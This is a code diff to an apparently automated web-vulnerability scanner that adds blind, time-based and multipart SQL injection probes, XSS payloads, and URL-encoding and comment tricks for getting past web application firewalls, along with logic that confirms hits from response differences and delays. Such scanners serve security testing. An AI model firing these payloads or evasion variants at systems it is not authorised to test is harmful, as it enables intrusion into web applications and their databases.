@@ -11,8 +11,9 @@
  */
 
 import type { TechniquePrimitive, TechniqueContext, AttackStep, StepExecutionResult, PrimitiveResult } from './framework'
+import { claimFor } from './framework'
 import { EvidenceGate } from '../intelligence/evidence-gate'
-import { observeParse, observeWaf, observeEndpoints } from './observers'
+import { observeParse, observeWaf, observeEndpoints, observeCompare } from './observers'
 
 const SQLI_PAYLOADS = [
   "'",
@@ -28,6 +29,31 @@ const XSS_PAYLOADS = [
   '${alert(1)}',
   '<svg/onload=alert(1)>',
 ]
+// Blind (boolean) differential + time-based — finds SQLi when no error leaks.
+const SQLI_BLIND_TRUE = "' AND '1'='1"
+const SQLI_BLIND_FALSE = "' AND '1'='2"
+const SQLI_TIME = "1' AND SLEEP(5)-- -"
+
+// WAF-bypass encodings: a server that decodes the payload will reflect the real
+// SQLi/XSS, bypassing a naive WAF that only inspects the raw (encoded) bytes.
+function wafBypassVariants(p: string): string[] {
+  const out = new Set<string>([p])
+  try { out.add(encodeURIComponent(p)) } catch { /* ignore */ }
+  try { out.add(encodeURIComponent(encodeURIComponent(p))) } catch { /* ignore */ }
+  out.add(p.replace(/ /g, '/**/'))
+  return [...out]
+}
+
+function safeDecode(p: string): string {
+  try { return decodeURIComponent(p) } catch { return p }
+}
+
+// Multipart/form-data delivery — exercises upload-style param handling.
+function multipartBody(param: string, value: string): string {
+  const boundary = '----ultimatrix'
+  return `--${boundary}\r\nContent-Disposition: form-data; name="${param}"\r\n\r\n${value}\r\n--${boundary}--\r\n`
+}
+const MULTIPART_CT = 'multipart/form-data; boundary=----ultimatrix'
 const SQLI_ERROR_MARKERS = [
   'sql syntax', 'mysql', 'postgresql', 'sqlite', 'sqlstate', 'ora-', 'odbc',
   'syntax error', 'unclosed quotation', 'quoted string', 'you have an error',
@@ -82,6 +108,69 @@ export const classicInjection: TechniquePrimitive = {
         metadata: { kind: 'xss', param, payload: p },
       })
     })
+    // Blind boolean differential: a true variant that behaves differently from a
+    // false variant is a strong SQLi signal even with no DB error in the body.
+    const blindUrlTrue = urlWithParam(url, param, SQLI_BLIND_TRUE)
+    const blindUrlFalse = urlWithParam(url, param, SQLI_BLIND_FALSE)
+    const blindBodyTrue = method !== 'GET' ? JSON.stringify({ [param]: SQLI_BLIND_TRUE }) : undefined
+    const blindBodyFalse = method !== 'GET' ? JSON.stringify({ [param]: SQLI_BLIND_FALSE }) : undefined
+    steps.push({
+      id: 'sqli-blind-true',
+      description: `Blind SQLi boolean-true into ${param}`,
+      request: { method, url: blindUrlTrue, headers, ...(blindBodyTrue ? { body: blindBodyTrue } : {}) },
+      expectedSignal: 'true variant response differs from false variant',
+      metadata: { kind: 'sqli-blind', blind: 'true', param, payload: SQLI_BLIND_TRUE },
+    })
+    steps.push({
+      id: 'sqli-blind-false',
+      description: `Blind SQLi boolean-false into ${param}`,
+      request: { method, url: blindUrlFalse, headers, ...(blindBodyFalse ? { body: blindBodyFalse } : {}) },
+      expectedSignal: 'false variant response differs from true variant',
+      metadata: { kind: 'sqli-blind', blind: 'false', param, payload: SQLI_BLIND_FALSE },
+    })
+    // Time-based: observable via response duration (SLEEP), not body content.
+    const timeUrl = urlWithParam(url, param, SQLI_TIME)
+    const timeBody = method !== 'GET' ? JSON.stringify({ [param]: SQLI_TIME }) : undefined
+    steps.push({
+      id: 'sqli-time',
+      description: `Time-based SQLi into ${param}`,
+      request: { method, url: timeUrl, headers, ...(timeBody ? { body: timeBody } : {}) },
+      expectedSignal: 'response delayed (SLEEP)',
+      metadata: { kind: 'sqli-time', param, payload: SQLI_TIME },
+    })
+    // WAF-bypass: encoded variants of a canonical SQLi + XSS payload. A backend
+    // that decodes before use reflects the real payload past a naive WAF.
+    const wafSeeds: Array<{ base: string; kind: 'sqli' | 'xss' }> = [
+      { base: "' OR '1'='1", kind: 'sqli' },
+      { base: '<script>alert(1)</script>', kind: 'xss' },
+    ]
+    wafSeeds.forEach((seed, si) => {
+      wafBypassVariants(seed.base).forEach((variant, vi) => {
+        if (variant === seed.base) return // raw already covered above
+        const stepUrl = urlWithParam(url, param, variant)
+        const body = method !== 'GET' ? JSON.stringify({ [param]: variant }) : undefined
+        steps.push({
+          id: `waf-${seed.kind}-${si}-${vi}`,
+          description: `WAF-bypass (${seed.kind}) encoded payload into ${param}`,
+          request: { method, url: stepUrl, headers, ...(body ? { body } : {}) },
+          expectedSignal: 'encoded payload decoded + reflected/errored past WAF',
+          metadata: { kind: seed.kind, wafBypass: true, param, payload: variant, decoded: safeDecode(variant) },
+        })
+      })
+    })
+    // Multipart delivery for a canonical SQLi payload (upload-style handlers).
+    steps.push({
+      id: 'sqli-multipart',
+      description: `Multipart-delivered SQLi into ${param}`,
+      request: {
+        method: method === 'GET' ? 'POST' : method,
+        url,
+        headers: { ...headers, 'content-type': MULTIPART_CT },
+        body: multipartBody(param, "' OR '1'='1"),
+      },
+      expectedSignal: 'database error leaked via multipart param',
+      metadata: { kind: 'sqli', multipart: true, param, payload: "' OR '1'='1" },
+    })
     return steps
   },
   async oracle(results: StepExecutionResult[], evidenceGate: EvidenceGate): Promise<PrimitiveResult> {
@@ -109,12 +198,22 @@ export const classicInjection: TechniquePrimitive = {
         }
       } else if (kind === 'xss') {
         const payload = String(r.step.metadata?.payload ?? '')
-        const reflected = lower.includes(payload.toLowerCase())
-        const escaped = body.includes(payload.replace(/</g, '&lt;'))
-        const unescaped = reflected && !escaped
-        if (unescaped) {
+        const decoded = safeDecode(payload)
+        const reflected =
+          body.includes(payload) ||
+          lower.includes(payload.toLowerCase()) ||
+          body.includes(decoded) ||
+          lower.includes(decoded.toLowerCase())
+        const escaped =
+          body.includes(payload.replace(/</g, '&lt;')) ||
+          body.includes(decoded.replace(/</g, '&lt;'))
+        if (reflected && !escaped) {
           xssHit = true
-          evidence.push({ kind: 'response', label: `XSS reflected unescaped [${r.step.metadata?.param}] ${r.step.request.method} ${r.step.request.url} → ${r.status}`, data: body.slice(0, 1500) })
+          evidence.push({
+            kind: 'response',
+            label: `XSS reflected unescaped [${r.step.metadata?.param}]${r.step.metadata?.wafBypass ? ' (WAF-bypass)' : ''} ${r.step.request.method} ${r.step.request.url} → ${r.status}`,
+            data: body.slice(0, 1500),
+          })
         }
       }
 
@@ -125,8 +224,41 @@ export const classicInjection: TechniquePrimitive = {
       }
     }
 
+    // Blind (boolean) SQLi: differential between the true and false variants.
+    const blindTrue = results.find((r) => r.step.metadata?.blind === 'true')
+    const blindFalse = results.find((r) => r.step.metadata?.blind === 'false')
+    if (blindTrue && blindFalse && !wafDetected) {
+      const cmp = await observeCompare(
+        { body: blindTrue.body ?? '', status: blindTrue.status ?? 0 },
+        { body: blindFalse.body ?? '', status: blindFalse.status ?? 0 },
+      )
+      const rawDivergent =
+        (blindTrue.status ?? 0) !== (blindFalse.status ?? 0) ||
+        (blindTrue.body ?? '').length !== (blindFalse.body ?? '').length
+      if (cmp.divergent || rawDivergent) {
+        sqliHit = true
+        evidence.push({
+          kind: 'response',
+          label: `Blind SQLi differential [${blindTrue.step.metadata?.param}] divergence=${(cmp.divergence ?? 0).toFixed(2)}`,
+          data: `TRUE status=${blindTrue.status} len=${(blindTrue.body ?? '').length} | FALSE status=${blindFalse.status} len=${(blindFalse.body ?? '').length}`,
+        })
+      }
+    }
+    // Time-based SQLi: a SLEEP payload visible via response duration.
+    const timeR = results.find((r) => r.step.metadata?.kind === 'sqli-time')
+    if (timeR && !wafDetected && (timeR.durationMs ?? 0) >= 2000) {
+      sqliHit = true
+      evidence.push({
+        kind: 'response',
+        label: `Time-based SQLi [${timeR.step.metadata?.param}] delay=${timeR.durationMs}ms`,
+        data: (timeR.body ?? '').slice(0, 800),
+      })
+    }
+
     const category = sqliHit ? 'sql_injection' : xssHit ? 'xss' : undefined
-    const { verified } = evidenceGate.verifyClaim(`${category ?? 'injection'} on ${results[0]?.step.request.url ?? ''}`)
+    const { verified } = evidenceGate.verifyClaim(
+      claimFor(category ?? 'injection', results[0]?.step.request.url, results[0]?.status, results[0]?.step.request.method),
+    )
     const observed = sqliHit || xssHit
     const confirmed = observed && verified
 
